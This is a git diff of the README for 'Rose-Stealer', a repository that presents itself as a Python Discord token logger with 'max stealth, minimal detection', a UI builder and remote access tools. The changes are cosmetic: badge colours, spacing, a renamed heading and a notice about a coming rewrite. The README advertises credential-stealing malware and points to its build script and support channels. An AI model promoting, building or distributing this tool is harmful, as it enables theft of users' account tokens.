@@ -8,21 +8,21 @@
 
 <div align="center" style="background-color: #da467d; padding: 20px;">
     <a href="https://discord.gg/sMawrDqnta">
-        <img src="https://img.shields.io/badge/Discord-%23f390fc.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
+        <img src="https://img.shields.io/badge/Discord-%23FF0060.svg?style=for-the-badge&logo=discord&logoColor=white" alt="Join our Discord">
     </a>
     <a href="https://t.me/rosegrabber">
-        <img src="https://img.shields.io/badge/Telegram-%23f390fc.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
+        <img src="https://img.shields.io/badge/Telegram-%23FF0060.svg?style=for-the-badge&logo=telegram&logoColor=white" alt="Join our Telegram">
     </a>
     <br>
     <br>
-    <img src="https://img.shields.io/github/languages/top/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Top Languages">
-    <img src="https://img.shields.io/github/stars/rose-dll/Rose-Stealer?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Stars">
+    <img src="https://img.shields.io/github/languages/top/rose-dll/Rose-Stealer?color=%23FF0060&style=for-the-badge" alt="Top Languages">
+    <img src="https://img.shields.io/github/stars/rose-dll/Rose-Stealer?color=%23FF0060&logoColor=%23FF0060&style=for-the-badge" alt="Stars">
     <br>
-    <img src="https://img.shields.io/github/commit-activity/w/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Commit Activity">
-    <img src="https://img.shields.io/github/last-commit/rose-dll/Rose-Stealer?color=%23f390fc&logoColor=%23f390fc&style=for-the-badge" alt="Last Commit">
+    <img src="https://img.shields.io/github/commit-activity/w/rose-dll/Rose-Stealer?color=%23FF0060&style=for-the-badge" alt="Commit Activity">
+    <img src="https://img.shields.io/github/last-commit/rose-dll/Rose-Stealer?color=%23FF0060&logoColor=%23FF0060&style=for-the-badge" alt="Last Commit">
     <br>
-    <img src="https://img.shields.io/github/issues/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Open Issues">
-    <img src="https://img.shields.io/github/issues-closed/rose-dll/Rose-Stealer?color=%23f390fc&style=for-the-badge" alt="Closed Issues">
+    <img src="https://img.shields.io/github/issues/rose-dll/Rose-Stealer?color=%23FF0060&style=for-the-badge" alt="Open Issues">
+    <img src="https://img.shields.io/github/issues-closed/rose-dll/Rose-Stealer?color=%23FF0060&style=for-the-badge" alt="Closed Issues">
     <br>
 </div>
 
@@ -30,10 +30,11 @@
 
 <div align="center">
     <h1>
-       Python-Powered Discord Token Logger: Max Stealth, Minimal Detection, and a Gorgeous UI Builder!
+      Python-Powered Discord Token Logger: Max Stealth, Minimal Detection, and a Gorgeous UI Builder!
     </h1>
-
 </div>
+
+### ⚠️ The development team is working on a full rewrite and an entire new version for Rose currently. This one will not receive updates anymore and a new repository is going to get created soon.
 
 ### Features
 
@@ -53,12 +54,14 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 - Launch UI by executing [`build.bat`](https://github.com/rose-dll/Rose-Stealer/blob/main/build.bat).
 
 ### Problems? Get help!
+
 **You can contact us here:**
 - [Telegram](https://t.me/gumbobr0t)
 - [Discord](https://discord.gg/sMawrDqnta)
 - [Issues](https://github.com/rose-dll/Rose-Stealer/issues)
 
 ### Docs
+
 For more guidance on e.g. the rats or the builder, you should check out the [docs](https://github.com/rose-dll/Rose-Stealer/tree/main/docs) folder.
 
 ### Changelog
@@ -79,6 +82,6 @@ The changelog history can be found in our [documentation](https://github.com/ros
 - [something-0001](https://github.com/smth.py)
 - [rud3p](https://github.com/rud3p)
 
-### Star Graph
+### Thanks 💞
 
 [![Star History Chart](https://api.star-history.com/svg?repos=rose-dll/Rose-Stealer&type=Date)](https://star-history.com/#rose-dll/Rose-Stealer&Date)
